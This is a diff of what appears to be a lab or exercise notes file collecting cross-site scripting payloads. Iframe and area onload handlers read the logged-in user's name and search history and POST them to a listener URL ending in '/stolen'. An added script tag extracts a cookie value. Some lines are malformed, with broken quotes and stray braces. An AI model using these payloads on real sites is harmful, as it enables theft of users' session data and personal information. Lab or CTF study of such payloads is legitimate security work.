@@ -57,8 +57,9 @@ Number 2:
 Number 3:
 <iframe onload="myFunction()" src="/default.asp"></iframe>
 <iframe onload="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
-<a href="#" onclick="someFunction();" return false;">LINK</a>
+<a href="#" onclick="someFunction();" return false;"
 
+<script> var goods=document.cookie.split(';')[2].substr(document.cookie.split(';')[2].indexOf('='),document.cookie.split(';')[2].length); console.log(goods)</script>
 
 <area ONLOAD ="var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()});">
 
